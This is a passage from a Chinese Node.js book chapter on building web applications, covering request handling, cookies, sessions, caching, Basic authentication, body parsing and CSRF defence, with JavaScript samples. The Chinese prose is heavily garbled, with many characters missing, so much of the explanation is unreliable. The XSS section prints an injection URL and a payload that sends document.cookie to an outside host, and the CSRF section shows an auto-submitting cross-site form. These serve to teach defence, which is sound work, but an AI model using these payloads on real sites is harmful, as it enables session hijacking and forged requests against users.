Node于事驱动，在分环境中能发它的，于事驱动可以实与大量的客端接，它可以好网的应。Node了相对的网用，以于事的编程接，使开发者在这些上分网应用。下一我们在本的上探的Web应用。
7.7
本的源下
. http://tools.ietf.org/html/rfc2616 . http://hi.baidu.com/miracletan2008/item/0bc16c9d7af261de7b7f01a2 . http://tools.ietf.org/html/rfc6455 . http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html 
. http://en.wikipedia.org/wiki/OSI_model 
. http://upload.wikimedia.org/wikipedia/commons/a/ae/SSL_handshake_with_two_way_authenti cation_with_certificates.svg

Web 
第章 



今，Web应用是网的，Web1.0、Web2.0一走，HTTP了网中的大多数量。着动网时的到，Web开始在动上发。在Web
的过后，Web开始应用发，JavaScript在前端可。多本在服务端实的务，前到端，前端MV*的也熟。与之的是，Node的前后端的次，JavaScript这门最初就能在服务端的语言，在经了前端的后端的后，事驱动V8的高性能，次为了服务端的者。在Web应用中，JavaScript不仅仅在前端中，因为Node的，前端会新定。
为了Web应用的开发工作，语言、、不。从言，在后端数大的就有Structs、CodeIgniter、Rails、Django、web.py，在前端也有的BackBone、Knockout.js、AngularJS、Meteor。在Node中，有Connect中，也有Express这样的MVC。的是Meteor，它在后端是Node，在前端是JavaScript，它是一个了前后端JavaScript的。
由于前后端用的语言都是JavaScript，在HTTP时，会有一些外的好。
语言环境，部分识不会因为语言环境的，上下一性好。
数（因为JSON）可以很好实前后端接使用。
一些务（）可以很自由量是在前端还是在后端，因为编程

语言相，以小。本会开Web应用在后端实中的。
8.1
在7中，我们了Node的网编程部分。从中我们可以发，Node是分网的，它的、事机使我们在网编程时分。本的Web应用的内，从http中服务端的request事开始分。request事发生于网接立，客端服务端发，服务端解，发HTTP请的时。在已触发reqeust事前，它已好ServerRequestServerResponse对以对请应的作。
以经的HelloWorld为，就是用ServerResponse实应的，下
var http = require('http'); 
http.createServer(function (req, res) { res.writeHead(200, {'Content-Type': 'text/plain'}); res.end('Hello World\n'); 
}).listen(1337, '127.0.0.1'); console.log('Server running at http://127.0.0.1:1337/'); 

对于一个Web应用言，仅仅只是上这样的应不到务的。在的务中，我们可能有下这些。请的。
. URL的解。
. URL中解。
. Cookie的解。
. Basic认。数的解。. 的上。之外，可能还有Session（会）的。管Node的API相对，

要务，还要大量的工作，仅仅一个request事这些。是要实这些并事，一的一，都从下这个数开
function (req, res) { res.writeHead(200, {'Content-Type': 'text/plain'}); res.end(); 
} 
在4中，我们对高数有过的我们的应用可能复杂，是只要最一个上的数作为数，createServer()作为request事的就可以了。你可能到ConnectExpress的中有下这样的
var app = connect(); // var app = express(); // TODO http.createServer(app).listen(1337); 
它的是。我们在务开始前，要为务一些，这些会在reqres对上，务使用。
8.1.1
在Web应用中，最的请是GETPOST，之外，还有HEAD、DELETE、PUT、CONNECT。请在于的一的一个，是大写。下为一个的
> GET /path?foo=bar HTTP/1.1 > User-Agent: curl/7.24.0 (x86_64-apple-darwin12.0) libcurl/7.24.0 OpenSSL/0.9.8r zlib/1.2.5 > Host: 127.0.0.1:1337 > Accept: */* > 
HTTP_Parser在解请的时候，，为req.method。，我们只要GETPOST请，是在RESTfulWeb服务中请分要，因为它会决定源的作为。PUT新一个源，POST要新一个源，GET一个源，DELETE一个源。
我们可以过请决定应为，下
function (req, res) { switch (req.method) { case 'POST':
 update(req, res);  break; 
case 'DELETE':  remove(req, res);  break; 
case 'PUT':  create(req, res);  break; 
case 'GET': default:  get(req, res); } } 
上了一请复杂的务分发的，是一为的。
8.1.2
了请分发外，最的请过于的了。部分在于的一的部分，下
GET /path?foo=bar HTTP/1.1 
HTTP_Parser解为req.url。一言，的URL是下这样的
http://user:pass@host.com:8080/p/a/t/h?query=string#hash 
客端（）会这个解，部分在一。要的是，hash部分会，不会在于的。最的务的应用是服务，它会中的，后应客端，下
function (req, res) { var pathname = url.parse(req.url).pathname; fs.readFile(path.join(ROOT, pathname), function (err, file) { 
 if (err) { res.writeHead(404); res.end('不关文件- -'); return; 
}  res.writeHead(200); 
 res.end(file); }); } 
还有一的分发场景是，它为为的组，外由信，下
/controller/action/a/b/c 
这的controller会对应到一个，action对应到的为，余的会作为数一些的。
function (req, res) { var pathname = url.parse(req.url).pathname; var paths = pathname.split('/'); var controller = paths[1] || 'index'; var action = paths[2] || 'index'; var args = paths.slice(3); if (handles[controller] && handles[controller][action]) {
 handles[controller][action].apply(null, [req, res].concat(args)); 
} else {  res.writeHead(500);  res.end('不响应控制器'); 
} } 
这样我们的务部分可以只关心的务实，下
handles.index = {}; 
handles.index.index = function (req, res, foo, bar) { res.writeHead(200); res.end(foo); 
}; 
8.1.3
于之后，在中后的?foo=bar&baz=val就是。这个会在后，请的部分。这部分内经要为务用，Node了querystring用于这部分数，下
var url = require('url'); var querystring = require('querystring'); var query = querystring.parse(url.parse(req.url).query); 
的是url.parse()个数，下
var query = url.parse(req.url, true).query; 
它会foo=bar&baz=val解为一个JSON对，下
{ foo: 'bar', baz: 'val' 
} 
在务用产生之前，我们的中者会，后在请对上务使用，下
function (req, res) { req.query = url.parse(req.url, true).query; hande(req, res); 
} 
要的是，中的多次，它的会是一个数组，下
// foo=bar&foo=baz var query = url.parse(req.url, true).query; // { // foo: ['bar', 'baz'] // } 
务的一定要是数组还是，否可能TypeError的情。
8.1.4Cookie 
1. Cookie
在Web应用中，请对务至关要，过它们已经可以很多务作了，是HTTP是一个的，实中的务是要一定的的，否区分用之的。识认一个用，最的就是Cookie（）了。
Cookie最由本Lynx作开发者Lou Montulli在1994年网景开发Netscape的一个本时发。它能服务与客端之的，最的用就是用用是否一次问网。在1997年RFC 2109，目前最新的为RFC 6265，它是一个由服务作实的。
Cookie的分为下几。
服务客端发Cookie。. Cookie。之后次都会Cookie发服务端。客端发的Cookie在请的Cookie中，我们可以过curl工这个，
下
curl -v -H "Cookie: foo=bar; baz=val" "http://127.0.0.1:1337/path?foo=bar&foo=baz" 
HTTP_Parser会有的解到req.headers上，Cookie就是req.headers. cookie。中的定，Cookie的是key=value; key2=value2的，我们要Cookie，解它也分，下
var parseCookie = function (cookie) { var cookies = {}; if (!cookie) { 
 return cookies; } 
var list = cookie.split(';'); 
for (var i = 0; i < list.length; i++) {  var pair = list[i].split('=');  cookies[pair[0].trim()] = pair[1]; 
} return cookies; }; 
在务之前，我们在req对上，务可以接问，下
function (req, res) { req.cookies = parseCookie(req.headers.cookie); hande(req, res); 
} 
这样我们的务就可以了，下
var handle = function (req, res) { res.writeHead(200); if (!req.cookies.isVisit) {
 res.end('动'); } else {  // TODO } }; 
请中，Cookie没有isVisit，都会收到欢一次到动这样的应。这一个问题，识到用没有问过我们的，我们的是否应客端已经问过的识客端的是过应实的，应的Cookie在Set-Cookie中。它的与请中的不相，中对它的定下
Set-Cookie: name=value; Path=/; Expires=Sun, 23-Apr-23 09:01:35 GMT; Domain=.domain.com; 
中name=value是包的部分，余部分是可数。这些可数会在后续Cookie发服务端的为。以下为要的几个。
. path这个Cookie到的，前问的不时，不发这个Cookie。
. ExpiresMax-Age是用这个Cookie时过的，不，在关时会这个Cookie。了过时，会Cookie内写入到中并，下次开有。Expires的是一个UTC的时，Cookie时过，Max-AgeCookie多后过。前者一言不在问题，是服务端的时客端的时不能，这时就会在。为，Max-Age这Cookie多之后过，不是一个的时。
. HttpOnly不过脚本document.cookie这个Cookie，事实上，HttpOnly之后，这个在document.cookie中不可。是在HTTP请的过程中，会发这个Cookie到服务端。
. Secure。Secure为true时，在HTTP中是的，在HTTPS中才有，创的Cookie

只能在HTTPS接中到服务端会，是HTTP接不会信，以很到。Cookie在中的后，下我们Cookie序的，相关下
var serialize = function (name, val, opt) { var pairs = [name + '=' + encode(val)]; opt = opt || {}; 
if (opt.maxAge) pairs.push('Max-Age=' + opt.maxAge); if (opt.domain) pairs.push('Domain=' + opt.domain); if (opt.path) pairs.push('Path=' + opt.path); if (opt.expires) pairs.push('Expires=' + opt.expires.toUTCString()); if (opt.httpOnly) pairs.push('HttpOnly'); if (opt.secure) pairs.push('Secure'); 
return pairs.join('; '); }; 
前的问，我们就能用的了，下
var handle = function (req, res) { 
if (!req.cookies.isVisit) { res.setHeader('Set-Cookie', serialize('isVisit', '1')); res.writeHead(200);  res.end('动'); 
} else {  res.writeHead(200);  res.end('动'); 
} }; 
客端收到这个Set-Cookie的应后，在之后的请时会在Cookie中上这个。的是，Set-Cookie是的，在中可能在多个。为res.setHeader的个数可以是一个数组，下
res.setHeader('Set-Cookie', [serialize('foo', 'bar'), serialize('baz', 'val')]); 
这会在部中Set-Cookie
Set-Cookie: foo=bar; Path=/; Expires=Sun, 23-Apr-23 09:01:35 GMT; Domain=.domain.com; Set-Cookie: baz=val; Path=/; Expires=Sun, 23-Apr-23 09:01:35 GMT; Domain=.domain.com; 
2. Cookie
由于Cookie的实机，一服务端客端发了Cookie的图，Cookie过，否客端次请都会发这些Cookie到服务端，一的Cookie过多，会大。大多数的Cookie并不要次都用上，因为这会的部分。在YSlow的性能优中有这一
. Cookie的的情是，在的Cookie，几有下的请都会上这些Cookie，这些Cookie在些情下是有用的，是在有些情下是用的。中以最为，的务定几不关心，Cookie对它言几是用的，是一有Cookie到相下，它的请中就会上Cookie。好在Cookie在时定了它的，只有相时才会发。以YSlow中有外一用Cookie的性能。
的
言之就是，为不要Cookie的组个可以实Cookie的。以很多网的会有的，使务相关的Cookie不源。用外的的好不只这，还可以下线程数量的，因为不，可以下线程数。是用外还是有一定的的，就是为IP要DNS，多一个就多一次DNS。YSlow中有这样一
. DNS
起DNS使用不的是的，是好在今的都会DNS，以这个作用的。
Cookie了可以过后端加的外，在前端中也可以过JavaScript，Cookie过document.cookie了JavaScript。前端在Cookie之后，后续的网请中就会上过后的。
目前，广在线统是最为Cookie的，过入的广者统脚本，Cookie前页定，这样就可以识用，到用的为，广就可以定广了。管这样的为起很可，是从Cookie的，它只能做到识，不能做有性的事情。心自己的用下为，就不要的脚本。
8.1.5Session 
过Cookie，服务可以实的。是Cookie并是的，前的过大就是一个的问题，最为的问题是Cookie可以在前后端，因数就极。服务端有部分是Cookie中的isVIP，一个用过Cookie就可以享到VIP服务了。上，Cookie对于数的是的。
为了解决Cookie数的问题，Session应生。Session的数只在服务端，客端，这样数的性到一定的，数也在中次都。在服务端数分，是个客服务中的数一一对应起，这有的实。
. Cookie数据的
有数都在Cookie中不可，是在Cookie中还是可以的。因为一，就了关系，也服务端在的数了。并且Session的有，遍的是20分，在20分内客端服务端没有产生，服务端就数。由于数过时，且在服务端数，因性相对高。是产生的
一服务端用了Session，它定一个作为Session的，这个可以定，Connect认用connect_uid，Tomcat会用jsessionid。一服务到用请Cookie中没有，它就会为之生一个，这个是一且不复的，并定时时。以下为生session的
var sessions = {}; var key = 'session_id'; var EXPIRES = 20 * 60 * 1000; 
var generate = function () { var session = {}; session.id = (new Date()).getTime() + Math.random(); session.cookie = { 
 expire: (new Date()).getTime() + EXPIRES }; sessions[session.id] = session; return session; 
}; 
个请到时，Cookie中的与服务端的数，过，就新生，下
function (req, res) { var id = req.cookies[key]; if (!id) { 
 req.session = generate(); 
} else {  var session = sessions[id];  if (session) { 
if (session.cookie.expire > (new Date()).getTime()) { // 时时间session.cookie.expire = (new Date()).getTime() + EXPIRES; req.session = session; 
} else { // 时的数据重生成delete sessions[id]; req.session = generate(); 
} 
 } else { //如session过不对重生成session req.session = generate(); 
} } handle(req, res); 
} 
仅仅新生Session还不以个程，还要在应客端时新的，以下次请时能对应服务端的数。这我们hack应对的writeHead()，在它的内部入Cookie的，下
var writeHead = res.writeHead; res.writeHead = function () {
var cookies = res.getHeader('Set-Cookie'); var session = serialize('Set-Cookie', req.session.id); cookies = Array.isArray(cookies) ? cookies.concat(session) : [cookies, session]; res.setHeader('Set-Cookie', cookies); return writeHead.apply(this, arguments); 
}; 
至，session在前后端对应的过程就了。这样的务可以session，以用与服务端的关系，下
var handle = function (req, res) { 
if (!req.session.isVisit) { res.session.isVisit = true;  res.writeHead(200);  res.end('动'); 
} else {  res.writeHead(200);  res.end('动'); 
} }; 
这样在session中的数接在Cookie中数要多。这实Cookie实，且也是目前大多数Web应用的。客端使用Cookie，这个上大多数的网实作。
字数据的
它的是请的，没有，会生新的的URL，下
var getURL = function (_url, key, value) { var obj = url.parse(_url, true); obj.query[key] = value; return url.format(obj); 
}; 
后，客端新发起请，下
function (req, res) { 
var redirect = function (url) {  res.setHeader('Location', url);  res.writeHead(302);  res.end(); 
}; 
var id = req.query[key]; 
if (!id) {  var session = generate(); redirect(getURL(req.url, key, session.id)); 
} else {  var session = sessions[id];  if (session) { 
if (session.cookie.expire > (new Date()).getTime()) { // 时时间session.cookie.expire = (new Date()).getTime() + EXPIRES; req.session = session;
handle(req, res); 
} else { 
// 时的数据重生成
delete sessions[id]; 
var session = generate(); 
redirect(getURL(req.url, key, session.id)); 
} 
 } else { 
//如session过不对重生成session 
var session = generate(); 
redirect(getURL(req.url, key, session.id)); 
} 
} 
} 
用问http://localhost/pathname时，服务端发中不session_id数，就会用到http://localhost/pathname?session_id=12344567这样一个的。收到302Location，就会新发起新的请，下
< HTTP/1.1 302 Moved Temporarily < Location: /pathname?session_id=12344567 
这样，新的请到时就能过Session的，内中的数过。
有的服务在客端用Cookie时，会用这实。过这，在应时Cookie。是这的大于于Cookie实的，因为只要中的发外一个人，他就有你相的。Cookie的在了者了
之后生，相对为。
还有一有的Session的是用HTTP请中的ETag，样对于后也是的，的这就不开了，的朋友可以到网上阅相关。
1. Session
在上的中，我们都Session数接在量sessions中，它于内中。在5的内部分，我们分了为Node会在内，这数在内中会极大的，用多，我们很可能就接触到了内的上，并且内中的数量加大，会起收的，起性能问题。
一个问题是我们可能为了用多CPU动多个程，这个在9中有。用请的接可能分到个程中，Node的程与程之是不能接享内的，用的Session可能会起。
为了解决性能问题Session数程享的问题，用的是Session中，本可能分在多个程的数，统一到中的数中。目前用的工是Redis、Memcached，过这些高的，Node程在内部数对，收问题内问题都可以解，并且这些高的过高，在Node中自好。
用Session起的一个问题是会起网问。上问网中的
数要问本中的数要，因为到、以网端自的I/O，管会用这些高的由有以下几. Node与服务接，的接，的只初始。
高接在内中数问。
服务与Node程在相的机上者相的机，网到的小。管用门的服务会接在内中问，小之小，的好

大于接在Node中数。为，一Session要的，就要作，的，下
function (req, res) { var id = req.cookies[key]; if (!id) { 
 req.session = generate(); handle(req, res); } else {  store.get(id, function (err, session) { if (session) { 
if (session.cookie.expire > (new Date()).getTime()) {  //时时间 session.cookie.expire = (new Date()).getTime() + EXPIRES;  req.session = session; 
} else {  //时的数据重生成 delete sessions[id]; req.session = generate(); 
} 
} else { // 如session过不对重生成session req.session = generate(); 
} handle(req, res);  }); } } 
在应时，新的session中，下
var writeHead = res.writeHead; 
res.writeHead = function () { var cookies = res.getHeader('Set-Cookie'); var session = serialize('Set-Cookie', req.session.id); cookies = Array.isArray(cookies) ? cookies.concat(session) : [cookies, session]; res.setHeader('Set-Cookie', cookies); // 存回缓存store.save(req.session); return writeHead.apply(this, arguments); 
}; 
2. Session
从前可以，管我们的数都在后端了，使它能，是过Cookie，还是的实，Session的在客端，这会在用的情。Web应用的用分多，自的机的一些就有机会中有的。一，服务端的数也可能接用。这到的Session的，就要这个加。
有一做是这个过加，使的本高。客端管可以，是由于不，信很。，我们只要在应时对，，我们服务端的数立过可，下
//将通过私名.分割原和名var sign = function (val, secret) { 
return val + '.' + crypto  .createHmac('sha256', secret)  .update(val)  .digest('base64')  .replace(/\=+$/, ''); 
}; 
在应时，session到Cookie中者URL中，下
var val = sign(req.sessionID, secret); res.setHeader('Set-Cookie', cookie.serialize(key, val)); 
接收请时，，下
//出部分进行名对比用户提的
var unsign = function (val, secret) { var str = val.slice(0, val.lastIndexOf('.')); return sign(str, secret) == val ? str : false; 
}; 
这样一，使者中.前的是服务端Session的ID，只要不secret的，就信，以实对Session的。Connect中使用，好，就是在自己Web应用的。
，是一个很好的解决，是者过了一个实的，他就能实的。一是客端的些有信与作为，后，这样者一不在始的客端上问，就会。这些有信包括用IP用（UserAgent）。
是始用与者之也在上信相的可能性，网IP相，相的客端信，不过入这些能高性。言，在Cookie中不他人，是一些的可能这个，的有XSS，下一下过XSS到用的，实。
. XSSXSS的是脚本（CrossSiteScripting，为XSS），都是由网开发者
决定些脚本可以在端，不过XSS会的脚本。它的要因多数是用的入没有，接。
下是个网的前端脚本，它会URLhash中的到页中，以实，下
$('#box').html(location.hash.replace('#', '')); 
者在发这的后，了这样的URL
http://a.com/pathname#<script src="http://b.com/c.js"></script> 
为了不者接发这URL中的，它可能会过URL一个网，下
http://t.cn/fasdlfj //者压http://url.cn/fasdlfb 
后最的网发个的在线用。这样一，这hash中的脚本会在这个用的中，这脚本中的内下
location.href = "http://c.com/?" + document.cookie; 
这用的Cookie了c.com，这个就是者的服务，他也就能到用的Session。后他在客端中用这个Cookie，从实了用的。用是网管，就可能极大的。
XSS的不这些，这不过多。在这个中，中有用的客端信的，使，者与用客端相，否不能实。
8.1.6
我们的经过一次C/S到B/S的，在HTTP之上的应用，客端了应用量的部性外，在、、上也优势。统客端在后的应用过程中仅仅要数，Web应用还要的组（HTML、JavaScript、CSS）。这部分内在大多数场景下并不经，要在次的应用中客端，不，它不要的。网，就要多时开页，对于用的会一定。因不要的，对用对服务者都有好。
为了高性能，YSlow中也到几关于的。
加Expires Cache-Control 到中。
 ETags。
. Ajax 可。

这我们开这几的源。我们的源，这也是一个要由服务与作的事情。RFC 2616对有一定的，只有定，个机才能有立。，POST、DELETE、PUT这为性的请作一不做
，大多数只应用在GET请中。使用的程图8-1。

图8-1使用的程图
，本没有时，会请服务端的内，并这部分内在本
的个目中。在次请时，它对本，不能定这本是否可以接使用，它会发起一次请。请，就是在的GET请中，If-Modified-Since，下
If-Modified-Since: Sun, 03 Feb 2013 06:01:12 GMT 
它问服务端是否有新的本，本的最后时。服务端没有新的本，只应一个304，客端就使用本本。服务端有新的本，就新的内发客端，客端本本。下
var handle = function (req, res) { 
fs.stat(filename, function (err, stat) {  var lastModified = stat.mtime.toUTCString();  if (lastModified === req.headers['if-modified-since']) { 
res.writeHead(304, "Not Modified"); res.end();  } else { 
fs.readFile(filename, function(err, file) { var lastModified = stat.mtime.toUTCString(); res.setHeader("Last-Modified", lastModified); res.writeHead(200, "Ok"); res.end(file); 
}); } 
}); }; 
这的请用时的实，是时有一些在。
的时动内并不一定动。时只能到，新的内生。为HTTP1.1中入了ETag解决这个问题。ETag的是Entity Tag，由服务端生，服
务端可以决定它的生。内生，请不会到时
动的。下是内生的
var getHash = function (str) { var shasum = crypto.createHash('sha1'); return shasum.update(str).digest('base64'); 
}; 
与If-Modified-Since/Last-Modified不的是，ETag的请应是If-None-Match/ETag，下
var handle = function (req, res) { 
fs.readFile(filename, function(err, file) { var hash = getHash(file); var noneMatch = req.headers['if-none-match'];  if (hash === noneMatch) { 
res.writeHead(304, "Not Modified"); res.end(); 
 } else { res.setHeader("ETag", hash); res.writeHead(200, "Ok"); res.end(file); 
} }); }; 
在收到ETag: "83-1359871272000"这样的应后，在下次的请中，会在请中If-None-Match:"83-1359871272000"。
管请可以在内没有的情下，是它会发起一个HTTP请，使客端会一定时应。可最好的就是请都不用发起。是否能接使用本本就是服务端在应内时，内起。YSlow到的，在应ExpiresCache-Control，。这个有区
HTTP1.0时，在服务端Expires可以要内，下
var handle = function (req, res) { 
fs.readFile(filename, function(err, file) { var expires = new Date(); expires.setTime(expires.getTime() + 10 * 365 * 24 * 60 * 60 * 1000);  res.setHeader("Expires", expires.toUTCString());  res.writeHead(200, "Ok"); res.end(file); 
}); }; 
Expires是一个GMT的时。在接到这个过后，只要本还在这个，在到时之前它都不会发起请。YUI3的CDN实践是在10年后过。是Expires的在于与服务之的时可能不一，这可能会一些问题，
前过，者到后并没有。在这情下，Cache-Control以的，实相的能，下
var handle = function (req, res) { 
fs.readFile(filename, function(err, file) {
 res.setHeader("Cache-Control", "max-age=" + 10 * 365 * 24 * 60 * 60 * 1000); 
 res.writeHead(200, "Ok");
 res.end(file); 
}); 
}; 
上的为Cache-Control了max-age，它Expires优的在于，Cache-Control能端与服务端时不的不一性问题，只要时的过时可。之外，Cache-Control的还能public、private、no-cache、no-store能的。
由于在HTTP1.0时还不max-age，今的服务端在的下多时对ExpiresCache-Control。在中个时在，且时时，max-age会Expires。
. 
我们了，以到网的目的，是一定，服务端外新内时，客端新。这使我们在使用时也要为定本，是URL，一内有新时，我们就发起新的URL请，使新内能客端新。一的新机有下。
次发，中Web应用的本http://url.com/?v=20130501。
次发，中内的hashhttp://url.com/?hash=afadfadwe。
大，内的hash淘会加高，因为内不一定着Web应用的本新，内没有新时，本的动的新，因以内的hash。
8.1.7Basic
Basic认是客端与服务端请时，过用实的一认。这要它的它在服务端过Node的程。
一个页要Basic认，它会请中的Authorization的内，的由认加，下
$ curl -v "http://user:pass@www.baidu.com/" > GET / HTTP/1.1 > Authorization: Basic dXNlcjpwYXNz > User-Agent: curl/7.24.0 (x86_64-apple-darwin12.0) libcurl/7.24.0 OpenSSL/0.9.8r zlib/1.2.5 > Host: www.baidu.com > Accept: */* 
在Basic认中，它会用部分组username + ":" + password。后Base64编，下
var encode = function (username, password) { 
return new Buffer(username + ':' + password).toString('base64'); 
}; 
用次问网页，URL中也没认内，会应一个401的，下
function (req, res) { 
var auth = req.headers['authorization'] || ''; 
var parts = auth.split(' '); 
var method = parts[0] || ''; // Basic 
var encoded = parts[1] || ''; // dXNlcjpwYXNz 
var decoded = new Buffer(encoded, 'base64').toString('utf-8').split(":"); 
var user = decoded[0]; // user 
var pass = decoded[1]; // pass 
if (!checkUser(user, pass)) { 
 res.setHeader('WWW-Authenticate', 'Basic realm="Secure Area"'); 
 res.writeHead(401); 
 res.end(); 
} else { 
 handle(req, res); 
} 
} 
在上的中，应中的WWW-Authenticate用样的认加。一言，认的情下，会对认信，图8-2。

图8-2的认信的对
认过，服务端应200之后，会用，在后续的请中都上Authorization信。
Basic认有多的，它经过Base64加后在网中，是这于，分，一只有在HTTPS的情下才会使用。不过Basic认的分广，几有的都它。
为了Basic认，RFC 2069了要问认，它加入了服务端机数认过程，在不做深入的解。
8.2
上的内本都中在HTTP请中，用于GET请大多数他请。部中的内已经能服务端大多数务作了，是的部大量的数，在务中，我们要接收一些数，、、JSON上、XML上。
Node的http只对HTTP的部了解，后触发request事。请中还有内部分（POST请，它有内），内部分要用自接收解。过的Transfer-EncodingContent-Length可请中是否有内，下
var hasBody = function(req) { return 'transfer-encoding' in req.headers || 'content-length' in req.headers; }; 
在HTTP_Parser解后，内部分会过data事触发，我们只以的可，下
function (req, res) { 
if (hasBody(req)) {  var buffers = [];  req.on('data', function (chunk) { 
buffers.push(chunk);  });  req.on('end', function () { 
req.rawBody = Buffer.concat(buffers).toString(); handle(req, res); 
 }); 8 
} else {  handle(req, res); } } 
接收到的Buffer为一个Buffer对后，为没有的，时在req.rawBody。
8.2.1
最为的数就是过网页数到服务端，下
<form action="/upload" method="post"> <label for="username">Username:</label> <input type="text" name="username" id="username" /> <br /> 
<input type="submit" name="submit" value="Submit" /> </form> 
认的，请中的Content-Type为application/x-www-form-urlencoded，下
Content-Type: application/x-www-form-urlencoded 
由于它的内相
foo=bar&baz=val
因解它分
var handle = function (req, res) { if (req.headers['content-type'] === 'application/x-www-form-urlencoded') { 
 req.body = querystring.parse(req.rawBody); } todo(req, res); 
}; 
后续务中接问req.body就可以到中的数。
8.2.2
了数外，的还有JSONXML，解他们的都相，都是Content-Type中的决定，中JSON的为application/json，XML的为application/xml。
要的是，在Content-Type中可能还下的编信Content-Type: application/json; charset=utf-8
以在做时，要区分，下
var mime = function (req) { var str = req.headers['content-type'] || ''; return str.split(';')[0]; 
}; 
1. JSON
从客端JSON内，这对于Node，要它都不要外的，下
var handle = function (req, res) { if (mime(req) === 'application/json') {  try { req.body = JSON.parse(req.rawBody); 
 } catch (e) { //异常内容响应Badrequest res.writeHead(400); res.end('Invalid JSON'); return; 
} } todo(req, res); 
}; 
2. XML
解XML复杂一，是社区有XML到JSON对的，这以xml2js为，下var xml2js = require('xml2js'); 
var handle = function (req, res) { if (mime(req) === 'application/xml') {  xml2js.parseString(req.rawBody, function (err, xml) { 
if (err) { // 异常内容响应Bad request res.writeHead(400); res.end('Invalid XML'); return; 
} req.body = xml; todo(req, res); 
 }); } }; 
用的，客端的数是，我们都可以过这数是，后用对应的解解可。
8.2.3
了的的内外，还有一的。的，内
可以过urlencoded的编内，发服务端，是务场景要用
接。在前端HTML中，与的在于中可以有file
的，以要定性enctype为multipart/form-data，下
<form action="/upload" method="post" enctype="multipart/form-data"> <label for="username">Username:</label> <input type="text" name="username" id="username" /> <label for="file">Filename:</label> <input type="file" name="file" id="file" /> <br /> 8 <input type="submit" name="submit" value="Submit" /> 
</form> 
在到multipart/form-data时，的请与不。它的中最为的下
Content-Type: multipart/form-data; boundary=AaB03x Content-Length: 18231 
它本次的内是由多部分的，中boundary=AaB03x定的是部分内的分，AaB03x是机生的一，的内过在它前加--分，时在它前后都加上--。外，Content-Length的是的。
上的了一个为diveintonode.js的，并上，生的下
--AaB03x\r\n Content-Disposition: form-data; name="username"\r\n \r\n Jackson Tian\r\n --AaB03x\r\n Content-Disposition: form-data; name="file"; filename="diveintonode.js"\r\n Content-Type: application/javascript\r\n \r\n 
 ... contents of diveintonode.js ... --AaB03x-- 
的的下
--AaB03x\r\n Content-Disposition: form-data; name="username"\r\n \r\n Jackson Tian\r\n 
的下
--AaB03x\r\n Content-Disposition: form-data; name="file"; filename="diveintonode.js"\r\n Content-Type: application/javascript\r\n \r\n 
 ... contents of diveintonode.js ... 
一我们是的，解它就分。的一是，由于是上，像、JSONXML样接收内解的不可接。接收大小的数量时，我们要分，下
function (req, res) { if (hasBody(req)) {  var done = function () { 
handle(req, res);  };  if (mime(req) === 'application/json') { 
parseJSON(req, done);  } else if (mime(req) === 'application/xml') { parseXML(req, done);  } else if (mime(req) === 'multipart/form-data') { parseMultipart(req, done); } } else {  handle(req, res); } } 
这我们req这个对接对应的解，由解自上的内，接收内并在内中，。这要到的是formidable。它于解，接收到的写入到系统的时中，并对应的，下
var formidable = require('formidable'); 
function (req, res) { if (hasBody(req)) { 
 if (mime(req) === 'multipart/form-data') { var form = new formidable.IncomingForm(); form.parse(req, function(err, fields, files) { 
req.body = fields; req.files = files; handle(req, res); 
}); } } else {  handle(req, res); } } 
因在务中只要req.bodyreq.files中的内可。
8.2.4
Node了相对的API，过它样的Web应用都是相对的，是在Web应用中，不不与数上相关的问题。由于Node与前端JavaScript的性，前端JavaScript甚至可以上到服务接，在这我们并不这样的动作，是内CSRF相关的问题。
1. 
在解、JSONXML部分，我们的是用的有数，后解，最后才务。这在在的问题是，它仅仅数量小的请，一数量过大，发生内的情。者过客端能分大量数，者次1 MB的内，只要并发请数量一大，内就会很。
要解决这个问题要有个。上内的大小，一过，接收数，并应400。过解，数到中，Node只小数。在上的上中已经有，这一下Connect中用的上数量的
，下
var bytes = 1024; 
function (req, res) { var received = 0, var len = req.headers['content-length'] ? parseInt(req.headers['content-length'], 10) : null; 
// 如内容过长限制回请求实体过长的状态码
if (len && len > bytes) {  res.writeHead(413);  res.end(); return; 
} // limit 
req.on('data', function (chunk) {  received += chunk.length; if (received > bytes) { 
//接收数据发end() req.destroy(); } }); 
handle(req, res); }; 
从上的中我们可以到，数是由包Content-Length的请是否过的，过接应413。对于没有Content-Length的请，一，在个data事中定可。一过，服务接收新的数。是JSONXML，极有可能解。对于上线的Web应用，加一个上大小分有于服务，在时，能定从应对。
2. CSRF 
CSRF的是Cross-SiteRequest Forgery，中为请。前了服务端与客端过Cookie识认用，言，用过问服务端的Session ID是的，是CSRF的者并不要Session ID就能用中招。
为了解CSRF是样一个过程，这以一个言的。个网有这样一个言程序，言的接下
http://domain_a.com/guestbook
用过POSTcontent就能言。服务端会自动从Session数中是的数，补usernameupdatedAt个后数中写入数，下
function (req, res) { var content = req.body.content || ''; var username = req.session.username; var feedback = { 
 username: username,  content: content,  updatedAt: Date.now() 
}; 
db.save(feedback, function (err) {  res.writeHead(200);  res.end('Ok'); 
}); } 
的情下，的言，就会在中的信。个者发了这的接在CSRF，他就可以在一个网（http://domain_b.com/attack）上了一个，下
<form id="test" method="POST" action="http://domain_a.com/guestbook"> <input type="hidden" name="content" value="vim是上的编辑器" /> 
</form> <script type="text/javascript"> $(function () {  $("#test").submit(); }); </script> 
这情下，者只要个domain_a的用问这个domain_b的网，就会自动一个言。由于在到domain_a的过程中，会domain_a的Cookie发到服务，管这个请是自domain_b的，是服务并不情，用也不情。
以上过程就是一个CSRF的过程。这的仅仅是一个言的，的是的接，程可想。管过Node接收数分，是问题还是不。好在CSRF并不可，解决CSRF的有加机的，下
var generateRandom = function(len) { 
return crypto.randomBytes(Math.ceil(len * 3 / 4))  .toString('base64')  .slice(0, len); 
}; 
也就是，为个请的用，在Session中一个机，下
var token = req.session._csrf || (req.session._csrf = generateRandom(24));
在做页的过程中，这个_csrf之前端，下
<form id="test" method="POST" action="http://domain_a.com/guestbook"> <input type="hidden" name="content" value="vim是上的编辑器" /> <input type="hidden" name="_csrf" value="< =_csrf >" /> 
%% 
</form> 
由于是一个机，者相的机的相大，以我们只要在接收端做一次就能识请是否为的，下
function (req, res) { var token = req.session._csrf || (req.session._csrf = generateRandom(24)); 
var _csrf = req.body._csrf; 
if (token !== _csrf) {  res.writeHead(403);  res.end("访问"); 
} else {  handle(req, res); } } 
_csrf也可以在于者请中。
8.3
前了多Web请过程中的过程，对于不的务，我们还是有不的
，这了由的问题。本会、MVC、RESTful由。
8.3.1
1. 
这的由在解的部分有过，人服的在于URL的与网目的一，，。这由的也分，请对应的发客端可。这在前解部分有，不复。
2. 
